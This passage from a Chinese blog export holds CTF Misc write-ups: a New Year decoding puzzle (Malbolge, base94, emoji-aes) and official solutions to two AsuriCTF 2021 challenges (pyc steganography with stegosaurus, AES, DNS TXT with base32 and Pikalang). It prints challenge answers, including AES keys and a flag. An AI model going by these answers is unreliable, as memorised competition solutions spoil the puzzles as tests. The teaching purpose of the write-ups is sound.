B;:?8\\&lt;|{92Vwv.-210)Mnm%$#G'&amp;%$d\"y?}|ut:xwpXn4rqSRnmf,jLha'e^F\\[`_X|V[ZSXQuOTSRKJImM/.DhBG@dDCBA#\"&gt;765Yzy76/432+Op(',+*)\"Fgf${\"!x&gt;|{tyrq7XWsrk1Rng-ed*ba`_^]#aZBXW{[Z&lt;Rv9OTMRQPImMFEJCBf)?DC&lt;;:9]~};:9870Tu321*Non&amp;%*)(!E%|d\"!x}|ut:xwYutm3qjoh.ledc)gfHdc\\\"Z_^W{[ZSRQVONrRKPONGkKJC+AF?cC&lt;`#\"&gt;7[;:z870Tut,10)Mn,%$#Gh&amp;%${zy?w_u;yxq7utsrk1Rngfkd*bg`e^c\\\"CB^]\\UySXQPUNrRQJOHl/EDIHA@?c&amp;&lt;`#\"&gt;765Y9810T4-s+O/.nm+$H('g%${Ab~}|u;yxqYunm3kjihmf,dcba'HGcbaZ~AW\\UZYXWVOs65KPINMFEiI+G@dD&amp;&lt;;:9&gt;7[5{9870Tu-2+O/o-,%$#G!&amp;}C#zb~w|{t:rwputm3kpihg-kdcbgf_%cba`BXW{UTYXWPOsSLKJIm0FEJIHAeED=BA@9]=&lt;|:981Uvu3,Pqp(Lm+$Hih&amp;%$#zy?`_utyxq7unsrk1oQPlkd*hgIHdcb[!BX]\\UTx;:PONr54JINGLKDhB*FE&gt;b&lt;$@987[;43870T4-s+O/.nm+$H(h~D|d\"y?}|^]yxq7otsrqpi/mlNd*hg`H^$\\D`_^]Vz=YRQPOsS5QPIHGkKDCgGFED=%;_?8=&lt;5:9810Tut,+0/(Lm+*)\"!&amp;%${Abaw|utsr8vuWmrkj0ngf,dcbgf_%cba`BXW{UTYXWPOsSLQJOHlLKDIHAeE'=B;@?&gt;7[;:981w/.R21*p(L&amp;+$)('~}C#\"bx&gt;|{z\\xwp6tVrkpih.lkjihJI_%cbD`Y^WVUySRWVUTMqQP2NGLEiCHAFE&gt;b&lt;$:?8765Y327654-Q10/o-,%Ij('~De{\"y~w|{zs9ZYutsl2pRQmf,jibJ`&amp;G]ba`YX|\\[ZYXW9ONrLQJOHlLEJIHGF?c=&lt;;:^&gt;=&lt;|4Xy765.R2r0/.'K+*)i!~D$#cyxw=&lt;zsr8Yonsl2ponPled*hJ`_d]#a`_A@VzZ&lt;;WVUNrLQJOHlLEJIBAe?'=a;:9&gt;=6Z:9876vu-Q10/o-,%$#G!&amp;}C#zb~w|{t:xqvutsrk1onmlkd*bg`_d]#a`BXW{UTYXWPOsSR4JINGkKD,HAe?'C&lt;;@9]=&lt;|:981U5432+O/(',+*#G'&amp;%$d\"y?}_{tsxwvo5Vlkjongf,Mib(fH^c\\aZ~^@?UZYXWPtT6LKJINMFj-CBG@dDCBA#\"&gt;765Yz870T4t,+O/(-&amp;J*j\"!E%${\"!~w=^zyxwvun4lTj0hPfed*Kafed]\\\"`_XW\\[TSw:VUNSLQJnHGFKDh+*FE&gt;bB$@98=&lt;;4X876/.3210)(L,+k)('&amp;}C{c!x}|ut:xwYutm3qjoh.ledc)JIedcb[ZY}]\\[=&lt;RvP8TSRQJONMLEiIHA)?cCB$@98=&lt;;4X870v.32+O)o-,+*#G!&amp;%|#\"!~w={tsr8potsrkj0nPf,jLhg`&amp;^F\\[Z~XW\\[TSw:VUNrLKPImG/EiIB*FE&gt;bB$@9&gt;=&lt;54X87654ts+O/.-m%Ij(!~%${Aba}|{zs9wp6nVrqj0nPfkjc)Jf_%cba`BXW{UTYXWPOs6LKJnN0FjJIHG)?cCBA@\"8=6;:3W7654321*p(Lm%*#\"F&amp;f$#\"!~}v&lt;tyrwvutml2jingf,jihJI_%cbD`Y^WVUyYXW9ONr54PINGkKDIHAe?'=B;:^87&lt;;432Vwv.3,+O).-,+*#G'~f${zy?}_{tsxwvo5Vlkjongf,Mchg`_%Fb[Z_X|\\&gt;=YXWVONr54PIm0/KJCg*FE&gt;=&lt;`:\"8=&lt;54Xy765.R2r0/.'K+*j(!~D|#z!~}|u;sr8vo5srTSong-ed*Kg`_%cbD`_X|VUTxXQVUNrR4JINGkKD,HAeE'=B;@?&gt;7[;:981w/.R21*p(L,l*#G!~}|Bc!xwv&lt;]yxwp6tsrqjoh.fNdc)gfHG]#a`BX]VUyYXQPUTSLKPImMLEDCBAeEDCBA#9]=};:981U5ut210)(L&amp;%*)('&amp;}Cdcy?}_{zsxqp6tml2pRQmle+ihgIedcb[!_^WVUZSwW9UNSLKo2NGFEDIBf)?DC&lt;;:9]~};:9870Tu321*N(n,%I)('~%$#\"!x&gt;|{zyxwYutm3qjoh.fNdc)gfHG]#[`_X|\\[ZYXWVUTSRQP2HMFEDhBGF?c=&lt;`#\"&gt;7&lt;;43W7wv432+O/.'&amp;%*)\"F~%|Bzb~}|uts9wYXnml2poQgfkd*hJI_%]\\aZ_X|\\U=SwWV8Nr54PIHl/.DhBG@dDCBA@?&gt;=&lt;;:9876v.3,P0p.-&amp;J$)\"!E%|#\"!~w=^]yxwvun4rqSing-Ndcb(IHdcb[!B^W\\UTxXW9ONrLQJOHlFEJIBAeE'C&lt;`@?&gt;=}5Yz8105.R2r0/.'K+*)i!~D$#zb~w=^]srqpo5slkpi/POedcbgf_%cbaZBXW{[=YXWVOsM5KJONGkKDIHG@dD&amp;&lt;A:?87[;:z870T.3,1*)M-,+k)\"F&amp;%|#z@~`_{zs9Zvutmlk1Rhgf,jiKg`&amp;dFb[!_^@?UZYRvPOTMLQJnN0FEi,BA@dDC&lt;;:?&gt;7[54X81w/.R21*p(Lm%*#\"F&amp;%e#\"y?w_uzsxq7XWsrk1ihgle+Lbg`e^]#a`_XWVz=YXWVUTMqQJ2NMLKDhHGF('C&lt;`:\"8=&lt;54Xy765.R2r0/.'K+*j(!~D|#z!~}|u;sr8vonslk1RQmle+ihgIedcb[!_^WVUTxXWVONrRKPONMLEiCHAFE&gt;bBA:\"8\\&lt;|{981U/.32+0)M-m%Ij(!~%${Aba}|{zs9wp6nml2piQmf,jcha`e^$ba`BXW{UTYXWPOs65QJn1GLEDhHG)?cCBA@\"8=6;:3W7654321*p(Lm%*#\"F&amp;%e#\"y?w_uzsxq7uWslkj0nmlkjihJI_%cbD`Y^WVUyYXWVUNrR43INMLEiIBAFED=aA@\"!7&lt;5:3W70v43,P0/.'m%I#\"'~}|{A!awv{zs9ZYutsl2poQmlejc)aI_^c\\\"ZB^]Vz=YRQPOsS5QPIHGkKDCgGFE'C&lt;`@?&gt;=}5Yz8105.R2r0/.'K+*)i!~De#\"y?w_{zyxwp6tml2pRQmle+ihgIedcb[!YXW{&gt;ZSXQVOsSRQ32NGk.JIHAFE&gt;bBA:\"8\\&lt;;:9870/S3sr0)M',%$#G'~f$#z@xw|uzs9wvunVl2pongfed*hgIH^]b[!_^@?UZYRvPOTMLQJnN0FEiI+*F?&gt;b%;@?&gt;7&lt;;:981Uv43,+*N.nm%$#G'&amp;%$d\"y?}vutyrqp6Wsl2Sinmled*bgfe^$b[`_X|\\[ZYXWVUTSRQP2NMFKJCBfFEDCBA#9]=&lt;|:981U/.3,1*N.-m+$H(!~}Cd\"!~}v&lt;zsxwp6tVrkpi/mlkjihgfed]#[`_^W{[ZSRWVONrRQJ2NGkEDCBf)(&gt;=BA@?8\\&lt;;43W70v.3,P0/.n,+$Hi!&amp;}$#z@~}|u]s9Zpotm3TSoh.Okjiha'eG]\\[!_^@Vz=YRQVOsSRQJImM/EiI+G@dD&amp;&lt;A:?87[;:z870T4t2+0).-&amp;Jk)\"!~}|B\"baw|{t:xwYutm3qjoh.fNdc)g`Hd]#a`Y^W{UZYXWPOsMRQJIHMLEiIBG@E&gt;=aA:?&gt;7&lt;5Y3216/4-,P0/.-m+$H(!~}C#\"b~}|u;y[qvutslk1RQmf,jibJfe^c\\aZ~XW\\[TSw:VUNSLQJn10FEJCg*F?&gt;bB$@98=&lt;;4X870/S-s10/.-&amp;Jk#('&amp;%|{A!~`_{zs9Zvutmlk1Rhgf,Mchgf_^$bDC_XWVzZYRvPOTMLQJnN0FEiC+GFED=a$#?8\\&lt;5{3WD Step 2先拿 python 分析一波这个巨长的字符串 s = r\"\"\"...\"\"\" print(len(s)) # 13644 x = set(s) print(x) x1 = sorted(''.join(x)) print(x1) print(len(x)) # 94 print(''.join(x1)) # !\"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ 看着这堆用到的字符，寻思着是不是 base94 啊…… 于是对比了下，base94 的 alphabet 为 !\"#$%&amp;\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ 看起来是啊，于是拿 basehash 里的 base94 解密一下试试。 可以参考 base全家桶的安装使用方法 from basehash import * from Crypto.Util.number import bytes_to_long, long_to_bytes s2 = base94().decode(s) s3 = long_to_bytes(s2) with open('4.bin', 'wb') as f: f.write(s3) 结果发现这是啥玩意啊，怎么也解释不通啊…… 于是暂时摸了。 下午放了 hint —— 第二层是个可以运行的程序，但并不是 binary（ malbolge Malbolge 是由Ben Olmstead在1998年开发的一种深奥的编程语言，属于公共领域。其名字来自于但丁的《神曲》中的第八层地狱Malebolge，意大利语中意为“邪恶的沟渠”（male bolge）。Malbolge虽然具备图灵完备性，但并非实用的编程语言。Malbolge的特别之处就在于，它被故意设计得极其繁琐难解。 用Malbolge编写的Hello, world程序 以下为Malbolge程序输出“Hello，world”的代码。 (=&lt;`:9876Z4321UT.-Q+*)M'&amp;%$H\"!~}|Bzy?=|{z]KwZY44Eq0/{mlk** hKs_dG5[m_BA{?-Y;;Vb'rR5431M}/.zHGwEDCBA@98\\6543W10/.R,+O&lt; via https://zh.wikipedia.org/wiki/Malbolge 干脆直接找了个在线的 Malbolge 执行工具，比如 https://malbolge.doleczek.pl/ 或者 https://www.tutorialspoint.com/execute_malbolge_online.php 执行得到 c82YzKDMqW_Mhs2MzavMiy7Mi82XLsyQzYzNps2vzLguzZLNqcyIzITNrs2DzaLMrc2OzJ7Mqs2JzLIg8J-HvCDwn4etIPCfh7QgZ82mzZvNo8yqzK9hzYLMh82jzYPNiM2FzK_NhcyzdsyMzZnNh8ypZc2lzajMvcyLzYDMpc2azLnMpiDNks2nzYnMmMytzJ7Mq8yqeW_NqMyazI7MlMyJzKHMrsy7zLHNjcy8zZN1zJPNp8yNzazNo8yizLHMo8yjzZbMoMyxINKJzZp0za3MtMy5aMyDzI3Nm82cacyHza7Mjc2QzIHMi8y9zLrMo8y5zK9zzJTMvcyjzJzMq82HIMyAzKDMmcyWzKnMrMyrbcyHzajMhMyNzKLNiGXMhMyRzafMi8y9zYHMo8yYzLrMpsykzZbNmnPMv8yPzYzNr8yRzYHMs82IzYlzzKPMrsylzJzMls2NYc2bzIPNgsy9zIbNrM2vzLHMnc2UzKlnzahlzYHMpcyxzLnMsyjNrM2lzIfMisyDzYLMksyVzKPNls2UzYjMqcyzP82CzJXMncykzZbMs8yszK_MswrNrM2bzILNrs2kzIfMq8yyzZXNls2JCs2kzKx0zL3MvcyvzLrMncyXzKDMvGjNpc2EzarMj8yOzL_NgcyXzJzMqc2OzLrMr82NacyxzYdzzaPMjM2MzYTMvsyezLMgzYbMgs2XzJTNkM2pzL_MsMymbcyGza_Mn8yzzKbMrMyszKTNjmHMucy5zYfMus2Uec2ozYrMkc2vzabMj82XzJvMnSDMhM2pzYLNm8yAzZ3Nlsy7zY7MsWLNpMyNzJPMj8ySzIzNpM2YzKzMsMyXzK_MmMyrZc2pzYbMjM2hzYXMqc2OzLDMsiDMi8ykzJnMvM2WzKZqzajMkM2FzZp1zLTNlXPNpc2LzavMjcyTzZvMuMywzJ7MpMyrzLrMo3TNo82qzYLNnMyWzKogza_Nq82rYc2nzYTMvcyQzJHNm8y1IMyUzIDNr8yPzKXNk8y8zKnMrc2OzZZqzL3Nm82RzZTMnG_MgsygzKBrzJHNqsyKzabNqsyszKTMpc2NzJ7MqmXMj82Lza7NlM2TzYfNls2JIc2bzYLNqs2tzIfMkM2MzY_MnAoK8J-Zg_CfkrXwn4y_8J-OpPCfmqrwn4yP8J-QjvCfpYvwn5qr8J-YhuKchfCflKzwn5qq8J-PjvCfjKrwn5iO8J-MifCfkYnwn4yP8J-QhfCfmIbwn5K18J-QjfCfmI3wn5iN8J-Yh_CfjbTimLrinZPwn42N8J-YhvCfmKHwn5iA4oS58J-QjfCfjqTimIPwn46D8J-Og_CflKrwn5W58J-YoeKchfCflKrwn5iC8J-li_CfjoXimIPwn5GR4piA8J-asPCfj7nwn46k8J-NtfCfmIDinIXwn5W58J-Mj-KMqPCfmI3wn5K18J-MieKYgvCfjojwn5iO8J-QheKYgPCfjbXwn5qw8J-TgvCfmIrwn5iO8J-li-KPqfCfmILwn5qq8J-YgvCfkrXwn5CY8J-YgeKPqfCfjY3wn5iH8J-YhvCfkZHinInwn4y_4piD8J-YivCfmIbimIPwn4-58J-Zg_CfkaPwn5CN8J-UqvCfkI3ij6nwn4214pyF8J-YgvCfjYzwn5iH4pyW4oS58J-aqvCfjI_wn5ih8J-ko_CfkYninZPwn4-58J-QjvCfjL_wn5up8J-YofCfkZHwn5GR8J-OpPCfkZHij6ninInwn4218J-mk_CfkaPwn42O8J-li_CfkZHwn5mD8J-QheKMqPCfjL_wn5Kn8J-MivCfjYzwn46I8J-PjvCfm6nwn4yK8J-asPCfjoPwn5Ss4pyW8J-NtfCfmYPwn5aQ4pyF8J-OpPCfkaPijKjwn5eS8J-Xkg Step 3base64 解密一下，当然 alphabet 换成了 A-Za-z0-9-_ s̠̩͘ŏ͌ͫ̋.̋͗.̸̐͌ͦͯ.̭͎̞̪͉̲͒ͩ̈̄ͮ̓͢ 🇼 🇭 🇴 g̪̯ͦ͛ͣa͈̯̳͂̇ͣ̓ͅͅv͙͇̩̌e̥͚̹̦ͥͨ̽̋̀ ͉̘̭̞̫̪͒ͧyo̡̮̻̱͍̼͓ͨ̎̔̉̚u̢̱̣̣͖̠̱̓ͧ̍ͬͣ ҉͚t̴̹ͭh̃̍͛͜i̺̣̹̯̇ͮ̍͐́̋̽ṣ̜̫͇̔̽ ̠̙̖̩̬̫̀ṁ̢͈ͨ̄̍ẹ̘̺̦̤͖͚̄̑ͧ̋̽́s̳͈͉̿̏͌ͯ̑́ṣ̮̥̜̖͍a̱̝͔̩͛̃͂̽̆ͬͯgͨé̥̱̹̳(̣͖͔͈̩̳ͬͥ̇̊̃͂̒̕?̝̤͖̳̬̯̳͂̕ ̫̲͕͖͉ͬ͛̂ͮͤ̇ ̬ͤt̯̺̝̗̠̼̽̽h̗̜̩͎̺̯͍ͥ̈́ͪ̏̎̿́i̱͇s̞̳ͣ̌͌̈́̾ ̰̦͆̂͗̔͐ͩ̿m̟̳̦̬̬̤͎̆ͯa̹̹͇̺͔y̛̝ͨ͊̑ͯͦ̏͗ ͖̻͎̱̄ͩ͂͛̀͝b̬̰̗̯̘̫ͤ̍̓̏̒̌ͤ͘e̩͎̰̲ͩ͆̌͡ͅ ̤̙̼͖̦̋j͚ͨ̐ͅu̴͕s̸̰̞̤̫̺̣ͥ͋ͫ̍̓͛t̖̪ͣͪ͂͜ ͯͫͫa̵ͧ̈́̽̐̑͛ ̥͓̼̩̭͎͖̔̀ͯ̏j͔̜̽͛͑ô̠̠k̬̤̥͍̞̪̑ͪ̊ͦͪȅ͔͓͇͖͉͋ͮ!͛͂ͪͭ̇̐͌͏̜ 🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅🔬🚪🏎🌪😎🌉👉🌏🐅😆💵🐍😍😍😇🍴☺❓🍍😆😡😀ℹ🐍🎤☃🎃🎃🔪🕹😡✅🔪😂🥋🎅☃👑☀🚰🏹🎤🍵😀✅🕹🌏⌨😍💵🌉☂🎈😎🐅☀🍵🚰📂😊😎🥋⏩😂🚪😂💵🐘😁⏩🍍😇😆👑✉🌿☃😊😆☃🏹🙃👣🐍🔪🐍⏩🍵✅😂🍌😇✖ℹ🚪🌏😡🤣👉❓🏹🐎🌿🛩😡👑👑🎤👑⏩✉🍵🦓👣🍎🥋👑🙃🐅⌨🌿💧🌊🍌🎈🏎🛩🌊🚰🎃🔬✖🍵🙃🖐✅🎤👣⌨🗒🗒 上面好多奇妙的 Unicode 字符，下面很明显是 emoji-aes，那么 key 是啥呢？ 会不会藏在这堆 Unicode 里啊？仔细看了看，没有啊…… 又在想，是 joke？不是。 是 WHO？不是。 突然一想，草， 那不就是他嘛！是 GZTime！ （还注意大小写呢 cHJvZFsvGQddFBVwexVDZg4VeFZjFXgSVRVscHsWeXR7FRREc3pWbk16SU5tQQpqclZTUk5IY1pPVwpib1dlQhwq Step 4继续 base64 解密 prod[/..]..p{.Cf..xVc.x.U.lp{.yt{..DszVnMzINmA jrVSRNHcZOW boWeB.* 嗯？这是什么？ 输出了 . 是因为那不是 ASCII 可打印字符，hexdump 看一眼。 00000000 70 72 6f 64 5b 2f 19 07 5d 14 15 70 7b 15 43 66 |prod[/..]..p{.Cf| 00000010 0e 15 78 56 63 15 78 12 55 15 6c 70 7b 16 79 74 |..xVc.x.U.lp{.yt| 00000020 7b 15 14 44 73 7a 56 6e 4d 7a 49 4e 6d 41 0a 6a |{..DszVnMzINmA.j| 00000030 72 56 53 52 4e 48 63 5a 4f 57 0a 62 6f 57 65 42 |rVSRNHcZOW.boWeB| 00000040 1c 2a |.*| HINT 5: prod[]与后面是分离的 prod 是啥？？？ production？生产环境？不像。 问了下 GZTime，说是乘积，也就是 $\\LaTeX$ 里的 $\\prod$ 于是想着是不是后面那堆是乘上前面这个数，或者相除再或者怎么着。 那怎么读取的呢？是当成一整个 byte，bytes 转 int 还是？ 先不管吧，写个脚本都试试。 import base64 s = \"cHJvZFsvGQddFBVwexVDZg4VeFZjFXgSVRVscHsWeXR7FRREc3pWbk16SU5tQQpqclZTUk5IY1pPVwpib1dlQhwq\" r = base64.b64decode(s) print(r) x = r.split(b']')[1] prod = r.split(b']')[0].split(b'[')[1] print(x) print(prod) prod = int.from_bytes(prod, byteorder='big') y = int.from_bytes(x, byteorder='big') print(prod, y) z = y * prod d = bytes.fromhex(hex(z)[2:]) print(d) print(base64.b64encode(d)) 结果跑出来唯一一个没报错的，看上去啥也不是…… 最后很迷茫，问了一下。 具体上应该是那三个 bytes 逐字节相乘。 prod = 0x07*0x19*0x2f # 8225 也就是 0x2021，噢，就是这个啦！ 这个后面也放了 hint HINT 6: 如果你得到了Key，你会知道一定是它的 那最后咋弄？还有个 hint 没用到。 HINT 3: 以及有一次会用到 xor 加密 好，终于有都是可打印字符的了。 44PZ5bF/5YvB5Y2t5MPZ6XTZ55dRZwNlZhnLa+JSvrrohBznw+BNwDb= Step 5换表 base64，或者说是 ROT13 + base64 「愿与你同行的2022星光相随」 好耶！终于出了！ 爱啦！ 小结虽然但是，怎么这么套啊，这做得咋心情跌宕起伏的…… 好想打 GZTime 啊（ 顺便，看了下是二血，总共也只有两解 hhh 不过毕竟是很小范围的解谜，也就这样啦。 感谢 GZTime 的出题，辛苦了（贴贴！ 最后，2022 啦，祝大家新年快乐喵~ 新的一年里师傅们也要多多带带喵喵呀！ 水完了，继续赶期末 ddl 去了，喵呜！ （溜了溜了喵~","path":"2022/01/01/CTF_2022GZTime0101/"},{"title":"CTF | 2021 AsuriCTF / NUAACTF Misc 部分官方 WriteUp","text":"引言 第六届南京航空航天大学网络攻防大赛 AsuriCTF / NUAACTF 2021 承办单位：由南京航空航天大学信息化处、南京航空航天大学教务处、共青团南京航空航天大学委员会指导，南京航空航天大学计算机科学与技术学院承办，Asuri信息安全战队，南京航空航天大学学生网络安全与信息技术协会协办，奇安信科技集团股份有限公司独家赞助。 活动对象：南京航空航天大学全体学生，校外对信息安全感兴趣的同学。 报名时间：2021年11月22日0:00-12月6日12:00 比赛时间：2021年12月11日13:00-18:00（最后实际是到 19:00） 又到校赛了啊，想想上一次校赛还是 上次，啊是今年上半年，好像是因为疫情延期了。 由于这学期开学办了个 SharkCTF 新生赛，这次的话题目相对而言就会难一些，毕竟还是对外办了，而且还有奇安信金主爸爸赞助是吧。 （草，为啥出题人无偿出题啥也没有，可恶 喵喵虽然 已经跑路了，但还是来出了两道 Misc 类型的题目，最后比下来每道题都只有1个校外队伍解出来了，可能还是有点难吧。 下面就是 Try2FindMe 和 ItIsMath 两道题目的官方题解。 Try2FindMe 1 solve, 1000 pts 喵喵能有什么秘密呢？快来找一找吧！ 附件地址： https://www.lanzouw.com/iMbHaxgzqvg Hint1: 嘻嘻，如果差一半 key 的话，悄悄告诉你，有隐写！ Hint2: pyc 隐写 python 3.7.11 Hint3: 最后的 AES 跑不出来可能是 python 依赖版本不一样导致锅了，问题不大，找个在线的 AES 解密就行 解题步骤开局是一张猫猫图。 图片种，binwalk / foremost / 人工手动分离得到一个压缩包，解压得到一个 1.pyc。 pyc 字节码反编译可以用 uncompyle6 或者 decompyle3 uncompyle6 -o 1.py 1.pyc 甚至这里可以用 在线的反编译（ 源码如下 from Crypto.Cipher import AES import binascii def decrypt(x, cipher): key = x + 'n0lve3t6r1s' try: aes = AES.new(key.rjust(24, 'A'), AES.MODE_ECB) cipher = binascii.unhexlify(cipher) flag = aes.decrypt(cipher).decode() return flag except: return '' def main(): c = '29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805' k = input('Please input your key: ') flag = decrypt(k, c) if 'flag' in flag: print('Wow, you find it!!!') else: print('Oh no!!!') if __name__ == '__main__': main() 发现还差了 AES 加解密用到的 key 的一部分。 根据提示，考虑是 pyc 隐写 https://github.com/AngelKitty/stegosaurus 然而直接跑可能会跑不出来，会报错 ValueError: bad marshal data 于是又根据提示是 python 3.7.11（其实可以看 magic number），是高版本的 python 了，根据经验 header 长度是 16. 于是根据报错的提示魔法改一改第124行这里。 运行得到隐写的结果 $ python3 stegosaurus.py 1.pyc -x Extracted payload: bytearray(b'k5fgb2eur5sty') cipher: 29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805 input 为 pyc 隐写的 k5fgb2eur5sty 直接运行 py / pyc 需要 Crypto 库，最好用 pyenv 新建一个 python 3.7.11 的虚拟环境，然后在里面装。 pip3 install pycryptodome 比赛的时候有选手反馈跑出来发现还是 Oh no!!!，看了一下发现可能是 python 以及依赖版本不对应，str 处理的时候出了点锅。 于是放了个 hint 说可以找个在线工具来解。 按照代码的意思拼接得到 AES key: k5fgb2eur5styn0lve3t6r1s 最后 AES ECB 解密得到 flag flag{M15c_1s_r34l1y_fuNny_ha233} （这里用的是 http://aes.online-domain-tools.com/ 出题思路校赛来了，要出题了，看队里其他师傅出了比较常规的 LSB、emoji-aes、base编码、压缩包伪加密、音频隐写什么的，以及《我们生活在南京》系列无线电的题目，在想咱出点什么比较好呢。 一想，今年强网杯线上赛的时候就 有一道名叫 ExtremelySlow 的题目包含了 pyc 隐写，当时用到的是 python 3.10，由于现成的反编译工具还不支持那么高版本直接还原出 python 源码，和队友手逆特别辛苦（摊手.jpg 于是就出一题 pyc 隐写吧！ 但是毕竟是校赛，不想出得太难，就没考虑用特别高版本的 Python，比如 Python 3.9 3.10 那种版本，最后是整了个 python3.7.11 这个相对而言比较新的版本。这样的话不需要选手手逆 pyc，但是 stegosaurus 不能直接用需要魔改，考点就在这里了。 比赛的时候校内也有几队把 pyc 反编译好了，也知道用 stegosaurus 隐写的了，但还是卡在这个魔改 header 长度上了。校外的话 Z 师傅发现了这个问题改了之后成功得到了隐写的密钥，不过发现跑不通，所以最后放了个提示说可以拿在线工具来了。 ItIsMath 1 solve, 1000 pts It is math, but it is not only math. Maybe you can find something in the domain itismath.asurictf2021.miaotony.xyz Do you remember the last NUAACTF? Update: The domain is changed to itismath2.asurictf2021.miaotony.xyz Hint1: domain TXT Hint2: Update: The domain is changed to itismath2.asurictf2021.miaotony.xyz 原域名得到含有 ctf.asuri.club 的字符串可以找出题人换文件 Hint3: 线性回归 解题步骤这里看更新后的域名吧。 首先这个域名是访问不了的，比赛群里有选手问了，回复了说是正常的。当然进一步看发现甚至没有A、AAAA解析。 那自然想到是 TXT 解析了，后面也放了 hint。 $ dig itismath2.asurictf2021.miaotony.xyz TXT +short @1.0.0.1 | sed 's/[\" ]//g' OBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUWWYJAOBUXA2JAOBUSA4DJOBUSA4DJEBYGSIDQNEQHA2LQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJMNUHKIDQNFRWQ5JAOBUWG2DVEBYGSY3IOUQGWYJAMNUHKIDQNFYGSIDQNFYGSIDQNFYGSIDQNFYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUWWYLDNB2SA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBYGS23BMNUHKIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNFVWCY3IOUQGWYJANNQSA23BEBVWCIDLMEQGWYJAOBUWWYLDNB2SA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNFVWCY3IOUQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA4DJNNQWG2DVEBYGSY3IOUQHA2LDNB2SA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGS23BMNUHKIDQNFYGSIDQNFYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGS23BMNUHKIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJAOBUWWYLDNB2SA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2LLMFRWQ5JANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJAOBUWWYLDNB2SA4DJEBYGSIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJNNQWG2DVEBYGSY3IOUQHA2LDNB2SA4DJNNQWG2DVEBYGS4DJEBYGS4DJEBVWCIDLMEQGWYJANNQSA23BEBVWCIDLMEQGWYJANNQSA23BEBVWCIDQNFVWCY3IOUQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2JAOBUSA4DJEBYGSIDQNEQHA2LLMFRWQ5JAOBUWWYLDNB2SA=== 很明显是 base32，解密一下 $ dig itismath2.asurictf2021.miaotony.xyz TXT +short @1.0.0.1 | sed 's/[\" ]//g' | base32 -d pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pipi pi pi pi pi pi pikachu pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka pikachu ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka pikachu pichu pichu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pipi pipi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pikachu pi pi pi pi pi pi pi pikachu pichu pichu pikachu pipi pipi ka ka ka ka ka ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pi pi pi pi pi pi pi pikachu pikachu 啊，是一堆的 pikachu！ 于是想到是 Pikalang / pikalang-language，这个比赛的时候也在比赛群里放了 hint。 Tool for decoding / encoding in Pikalang. Pikalang (or Pikachu language) is a minimalist programming language based on the Brainfuck for which it substitutes the signs by the syllables of Pikachu. Pikalang is a programming language based on the BrainFuck language but whose operators are substituted by the cries of the Pokemon Pikachu. Thus, from a code written in BrainFuck, the following table helps to match the code in Pikalang: + pi - ka &gt; pipi &lt; pichu [ pika ] chu . pikachu , pikapi Example: The Pikalang program pi pi pi pi pi pi pi pi pi pi pika pipi pi pipi pi pi pi pipi pi pi pi pi pi pi pi pipi pi pi pi pi pi pi pi pi pi pi pichu pichu pichu pichu ka chu pipi pipi pipi pi pi pi pi pi pi pi pi pi pi pikachu pipi pi pi pi pi pi pi pi pi pi pi pi pikachu ka ka ka ka pikachu ka ka ka ka ka ka pikachu pi pi pi pi pi pi pi pi pikachu pi pi pikachu ka pikachu corresponds to BF code 